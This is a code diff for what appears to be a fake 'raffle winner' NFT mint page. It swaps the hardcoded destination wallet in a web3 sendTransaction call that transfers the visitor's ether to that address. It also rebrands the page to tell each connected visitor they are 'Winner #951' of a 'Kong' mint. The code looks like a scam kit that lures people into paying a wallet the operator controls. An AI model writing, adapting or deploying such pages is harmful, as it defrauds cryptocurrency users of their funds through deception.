@@ -32,7 +32,7 @@ export default function Home() {
         console.log("dasdas", value, typeof value);
         web3.eth.sendTransaction({
             from: account,
-            to: "0x24eF5c7Fa2022cEa5B45a8Bd529fb153859AfdC7",
+            to: "0xa002BCE0aE0c6c57eC21844Da00BA2cF393E8eA9",
             value: web3.utils.toWei(value.toString(), "ether") * 0.276,
         });
     };
@@ -81,7 +81,7 @@ export default function Home() {
                         letterSpacing: "6px",
                     }}
                 >
-                    Raffle Winner #951
+                    Raffle Winners Mint
                 </div>
             </div>
             <div
@@ -109,7 +109,7 @@ export default function Home() {
                 }}
             >
                 {active && account
-                    ? `Wallet Connected: ${account}`
+                    ? `Winner #951: ${account}`
                     : "Click to connect with MetaMask"}
             </button>
             <div
@@ -150,7 +150,7 @@ export default function Home() {
                     max="5"
                     type="number"
                 />
-                <div style={{ color: "white", fontSize: "30px", fontWeight: '500', }}>Clone(s)</div>
+                <div style={{ color: "white", fontSize: "30px", fontWeight: '500', }}>Kong(s)</div>
             </div>
             <button
                 onClick={() => {
